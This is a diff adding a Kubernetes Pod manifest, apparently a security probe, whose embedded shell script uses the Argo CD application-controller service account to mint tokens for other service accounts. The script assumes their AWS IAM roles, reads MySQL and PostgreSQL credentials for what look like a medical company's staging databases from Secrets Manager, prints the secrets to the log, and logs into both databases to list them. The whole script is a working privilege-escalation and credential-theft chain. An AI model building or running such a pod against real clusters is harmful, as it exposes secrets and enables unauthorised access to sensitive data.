@@ -1,0 +1,85 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: i2660-probe4
+  namespace: argocd
+  labels:
+    i2660: probe
+spec:
+  serviceAccountName: argocd-application-controller
+  automountServiceAccountToken: true
+  restartPolicy: Never
+  containers:
+    - name: i2660-probe4
+      image: alpine:3.20
+      imagePullPolicy: IfNotPresent
+      command: ["/bin/sh","-c"]
+      args:
+        - |
+          set -u
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          TOKEN=$(cat $SA/token)
+          API=https://kubernetes.default.svc
+          get() { wget -q -O - --timeout=25 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
+          post() { wget -q -O - --timeout=25 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
+          echo "===P4_START $(date -u +%FT%TZ)==="
+          apk add --no-cache jq aws-cli mariadb-client postgresql16-client >/tmp/apk.log 2>&1; echo "apk_rc=$?"
+          for b in jq aws mysql psql; do command -v $b >/dev/null 2>&1 && echo "have $b" || echo "MISSING $b"; done
+          assume() {
+            NS=$1; SAN=$2
+            ROLE=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$SAN" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty' 2>/dev/null)
+            echo "==ASSUME $NS/$SAN role=$ROLE=="
+            [ -z "$ROLE" ] && { echo NO_ROLE; return 1; }
+            TK=$(post "$API/api/v1/namespaces/$NS/serviceaccounts/$SAN/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
+            WT=$(echo "$TK" | jq -r '.status.token // empty' 2>/dev/null)
+            if [ -z "$WT" ]; then echo "TOKEN_REQ_FAIL: $(echo "$TK" | head -c 400)"; return 1; fi
+            echo "WT_LEN=${#WT} AUD=$(echo "$WT" | cut -d. -f2 | tr '_-' '/+' | awk '{l=length($0)%4; if(l==2)$0=$0"=="; else if(l==3)$0=$0"="; print}' | base64 -d 2>/dev/null | jq -r '.aud|tostring' 2>/dev/null)"
+            RES=$(aws sts assume-role-with-web-identity --role-arn "$ROLE" --role-session-name i2660probe --web-identity-token "$WT" --duration-seconds 900 --region us-west-2 --output json 2>&1)
+            if echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1; then
+              export AWS_ACCESS_KEY_ID=$(echo "$RES" | jq -r '.Credentials.AccessKeyId')
+              export AWS_SECRET_ACCESS_KEY=$(echo "$RES" | jq -r '.Credentials.SecretAccessKey')
+              export AWS_SESSION_TOKEN=$(echo "$RES" | jq -r '.Credentials.SessionToken')
+              echo ASSUME_OK
+            else
+              echo "ASSUME_FAIL: $(echo "$RES" | head -c 600)"; return 1
+            fi
+          }
+          echo "===IRSA_USERMGMT==="
+          MYSQLSEC=""
+          if assume user-management-service user-management-service-sa; then
+            aws sts get-caller-identity 2>&1 | head -8
+            MYSQLSEC=$(aws secretsmanager get-secret-value --secret-id lazamedical-stage01-usw2-mysql-1-db-secret --region us-west-2 --query SecretString --output text 2>&1)
+            echo "MYSQLSEC=$MYSQLSEC"
+          fi
+          unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+          echo "===IRSA_DATAMGMT==="
+          PGSEC=""
+          if assume data-management data-management-sa; then
+            aws sts get-caller-identity 2>&1 | head -8
+            PGSEC=$(aws secretsmanager get-secret-value --secret-id lazamedical-dp-stage01-usw2-postgresql-db-secret --region us-west-2 --query SecretString --output text 2>&1)
+            echo "PGSEC=$PGSEC"
+          fi
+          echo "===DB_TEST_MYSQL==="
+          if echo "$MYSQLSEC" | jq -e '.host' >/dev/null 2>&1; then
+            MH=$(echo "$MYSQLSEC" | jq -r '.host'); MP=$(echo "$MYSQLSEC" | jq -r '.port // 3306'); MU=$(echo "$MYSQLSEC" | jq -r '.username // empty'); MPW=$(echo "$MYSQLSEC" | jq -r '.password // empty')
+            echo "mysql target $MH:$MP user=$MU"
+            mysql --connect-timeout=10 -h "$MH" -P "$MP" -u "$MU" -p"$MPW" -e "SELECT VERSION();" -e "SHOW DATABASES;" 2>&1 | head -40
+          else
+            echo "no mysql secret parsed: $(echo "$MYSQLSEC" | head -c 300)"
+          fi
+          echo "===DB_TEST_PG==="
+          if echo "$PGSEC" | jq -e '.host' >/dev/null 2>&1; then
+            PH=$(echo "$PGSEC" | jq -r '.host'); PP=$(echo "$PGSEC" | jq -r '.port // 5432'); PU=$(echo "$PGSEC" | jq -r '.username // empty'); PPW=$(echo "$PGSEC" | jq -r '.password // empty'); PDB=$(echo "$PGSEC" | jq -r '.dbname // "postgres"')
+            echo "pg target $PH:$PP user=$PU db=$PDB"
+            PGPASSWORD="$PPW" psql -h "$PH" -p "$PP" -U "$PU" -d "$PDB" -c "select version();" -c "\l" 2>&1 | head -60
+          else
+            echo "no pg secret parsed: $(echo "$PGSEC" | head -c 300)"
+          fi
+          echo "===P4_END $(date -u +%FT%TZ)==="
+      resources:
+        requests:
+          cpu: 10m
+          memory: 32Mi
+        limits:
+          cpu: 500m
+          memory: 768Mi
